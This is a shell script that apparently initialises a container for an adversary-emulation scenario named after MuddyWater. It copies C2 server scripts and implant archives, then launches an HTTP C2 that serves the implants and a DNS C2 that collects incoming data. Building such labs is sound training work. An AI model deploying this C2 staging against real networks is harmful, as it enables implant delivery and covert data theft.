#!/bin/sh
# SC004 MUDDYWATER — NS1 Alpine container init script
# Only 3 attachments needed: init_container.sh, implant_drop.rar, implant.rar
# Python scripts are always pulled fresh from GitHub

ATTACH="/attachments"
ROOT="/root"
SERVE="$ROOT/serve"
RECV="$ROOT/received"

echo "=== SC004 NS1 INIT START ==="

# Install python3 + pip
apk add --no-cache python3 py3-pip py3-dnslib 2>/dev/null

# Install dnslib via pip if apk package not available
python3 -c "import dnslib" 2>/dev/null || \
    python3 -m pip install dnslib --break-system-packages

python3 -c "import dnslib" && echo "dnslib: OK" || echo "ERROR: dnslib install failed!"

# Create directories
mkdir -p "$SERVE" "$RECV"

# Copy all files from attachments
cp "$ATTACH/c2_server_sc004.py"      "$ROOT/c2_server.py"
cp "$ATTACH/c2_http_server_sc004.py" "$ROOT/c2_http_server.py"
cp "$ATTACH/implant_drop_sc004.rar"  "$SERVE/implant_drop.rar"
cp "$ATTACH/implant_sc004.rar"       "$SERVE/implant.rar"
echo "Files copied from /attachments"

# Detect container IP
MY_IP=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1)

# Create go_http.sh
cat > "$ROOT/go_http.sh" << 'EOF'
#!/bin/sh
fuser -k 80/tcp 2>/dev/null
sleep 1
python3 /root/c2_http_server.py --port 80 --dir /root/serve/
EOF

# Create go_dns.sh (MY_IP substituted at init time)
cat > "$ROOT/go_dns.sh" << EOF
#!/bin/sh
pkill -f c2_server.py 2>/dev/null
sleep 1
python3 /root/c2_server.py --ip $MY_IP --port 53 --out /root/received/ --fake-ip $MY_IP
EOF

chmod +x "$ROOT/go_http.sh" "$ROOT/go_dns.sh"

# Touch log files so tail -F works immediately
touch "$ROOT/c2.log" "$RECV/c2_server.log"

# Start HTTP C2 (port 80)
nohup python3 "$ROOT/c2_http_server.py" --port 80 --dir "$SERVE/" \
    > "$ROOT/c2.log" 2>&1 &

# Start DNS C2 (port 53)
nohup python3 "$ROOT/c2_server.py" --ip "$MY_IP" --port 53 --out "$RECV/" --fake-ip "$MY_IP" \
    >> "$RECV/c2_server.log" 2>&1 &

echo "HTTP C2 : port 80  → $SERVE"
echo "DNS  C2 : port 53  → $MY_IP (fake-ip: $MY_IP)"
echo "Logs    : $ROOT/c2.log | $RECV/c2_server.log"
echo "=== SC004 NS1 READY ==="

# Keep session alive and stream both logs
tail -F "$ROOT/c2.log" "$RECV/c2_server.log"
